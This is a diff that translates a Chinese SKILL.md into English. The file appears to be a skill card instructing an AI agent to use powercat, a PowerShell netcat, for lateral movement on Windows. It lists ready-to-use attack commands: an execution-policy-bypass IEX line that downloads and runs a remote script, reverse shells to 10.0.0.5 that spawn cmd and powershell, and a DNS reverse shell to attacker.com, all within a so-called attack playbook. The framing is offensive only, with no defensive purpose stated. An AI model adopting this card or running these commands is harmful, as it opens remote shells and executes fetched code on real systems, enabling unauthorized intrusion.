@@ -2,37 +2,38 @@
 name: powercat-netcat-ps
 description: "Windows-native netcat. Signals: lateral movement, psexec, listening, reverse."
 zh-signals: "powercat: Windows 原生 netcat。信号:横向移动,psexec,监听,反弹。"
+when-to-use: "Use powercat when you have a Windows shell and need a native PowerShell netcat for listening, reverse shells over TCP/UDP/DNS/SSL, or file transfer during lateral movement."
 ---
 
 # powercat
 
-- 攻击大类:C31 远程服务横向移动
-- 上游仓库:https://github.com/besimorhino/powercat
-- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C31 Remote Service Lateral Movement
+- Upstream Repository: https://github.com/besimorhino/powercat
+- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/besimorhino/powercat
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `powershell -ep bypass -c 'IEX (New-Object Net.WebClient).DownloadString("http://vps/powercat.ps1"); powercat -l -p 4444 -e cmd'` | 监听 |
-| `powercat -c 10.0.0.5 -p 4444 -e cmd` | 反弹 |
-| `powercat -l -p 4444 -r dns:attacker.com` | DNS 反弹 |
+| `powershell -ep bypass -c 'IEX (New-Object Net.WebClient).DownloadString("http://vps/powercat.ps1"); powercat -l -p 4444 -e cmd'` | Listener |
+| `powercat -c 10.0.0.5 -p 4444 -e cmd` | Reverse shell |
+| `powercat -l -p 4444 -r dns:attacker.com` | DNS reverse shell |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### Windows 原生 netcat
+### Native Windows netcat
 
 ```bash
-# 已有 shell 内: IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/powercat.ps1')
+# Inside an existing shell: IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/powercat.ps1')
 powercat -c 10.0.0.5 -p 443 -e powershell
 ```
 
-## 注意事项
+## Notes
 
-PowerShell 版 netcat,支持 TCP/UDP/DNS/SSL 反弹+文件传输,免安装单文件。
+PowerShell-based netcat supporting TCP/UDP/DNS/SSL reverse connections plus file transfer, delivered as a single file with no installation required.
